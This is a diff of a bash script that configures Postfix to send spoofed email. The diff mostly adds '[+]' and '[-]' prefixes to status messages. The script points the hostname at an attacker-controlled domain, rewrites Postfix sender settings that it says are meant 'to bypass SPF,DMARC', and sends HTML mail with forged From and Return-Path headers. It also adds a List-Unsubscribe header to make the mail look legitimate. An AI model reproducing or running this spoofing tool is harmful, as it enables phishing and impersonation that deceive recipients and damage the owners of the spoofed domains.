@@ -108,21 +108,21 @@ fi
 MAIL_FROM_DOMAIN=$(echo $mail_from | awk -F@ '{print $2}')
 # Domain spoofing from should be under control of attacker.
 SPOOF_DOMAIN=$(echo $spoof_domain | awk -F@ '{print $2}')
-echo "Updating hostname to $spoof_domain so PTR record lookup is for domain under control..."
+echo "[+] Updating hostname to $spoof_domain so PTR record lookup is for domain under control..."
 sudo sed -i "s/^myhostname =.*/myhostname = $spoof_domain/" /etc/postfix/main.cf
-echo "Updating Postfix configuration..."
+echo "[+] Updating Postfix configuration..."
 sed -i "s/^mydestination =.*/mydestination = $myhostname, $MAIL_FROM_DOMAIN, localhost.localdomain, , localhost/" /etc/postfix/main.cf
 sudo systemctl restart postfix
 
 # add List-Unsubscribe header
-echo "Adding List-Unsubscribe header..."
+echo "[+] Adding List-Unsubscribe header..."
 mail_headers="$mail_headers -aList-Unsubscribe:<mailto:unsubscribe@example.com?subject=unsubscribe>"
 
 # get domain from mail_from argument
 domain=$(echo $mail_from | awk -F@ '{print $2}')
 
 # replace example.com domain with domain from mail_from argument
-echo "Replacing example.com domain with domain from mail_from argument..."
+echo "[+] Replacing example.com domain with domain from mail_from argument..."
 mail_headers=$(echo $mail_headers | sed "s/example.com/$domain/")
 
 # check the status of the postfix service
@@ -131,29 +131,29 @@ status=$(systemctl status postfix)
 # check if the postfix service is active
 if [[ "$status" == *"active"* ]]; then
   # postfix is active, so let the user know
-  echo "Postfix is already started, ready to start..."
+  echo "[-] Postfix is already started, ready to start..."
 else
   # postfix is inactive, so start it
   systemctl start postfix
 
   # let the user know that postfix was started
-  echo "Postfix has been started..."
+  echo "[+] Postfix has been started..."
 fi
 
 # Set smtp.mailfrom to spoof SPF,DMARC and DKIM
-echo "Setting smtp.mailfrom address to mail_envelope value to bypass SPF,DMARC,DKIM..."
+echo "[+] Setting smtp.mailfrom address to mail_envelope value to bypass SPF,DMARC..."
 sudo sed -i "s/^smtp.mailfrom =.*/smtp.mailfrom = $mail_envelope/" /etc/postfix/main.cf
 sudo sed -i "s/^header.from =.*/header.from = $mail_from/" /etc/postfix/main.cf
-echo "Appling changes to postfix configuration..."
+echo "[+] Appling changes to postfix configuration..."
 sudo service postfix restart
 
 # Cleaning up
-echo "Cleaning up for next run..."
+echo "[-] Cleaning up for next run..."
 sed -i '/smtp.mailfrom/d' /etc/postfix/main.cf
 sed -i '/header.from/d' /etc/postfix/main.cf
 
 # send the email using the mail command
-echo "Sending email..."
+echo "[+] Sending email..."
 if [ -z "$bcc_address" ]; then
   #body="<html>$body</html>"
   mail -s "$subject" -a "From: $mail_from" -a "Content-Type: text/html;" -a "Return-Path: $mail_envelope" "$mail_headers" "$mail_to" <<< "$body"
@@ -164,7 +164,7 @@ fi
 
 # check if the mail command was successful
 if [ $? -eq 0 ]; then
-  echo "Email sent successfully!"
+  echo "[+] Email sent successfully!"
 else
-  echo "Failed to send email!"
+  echo "[-] Failed to send email!"
 fi
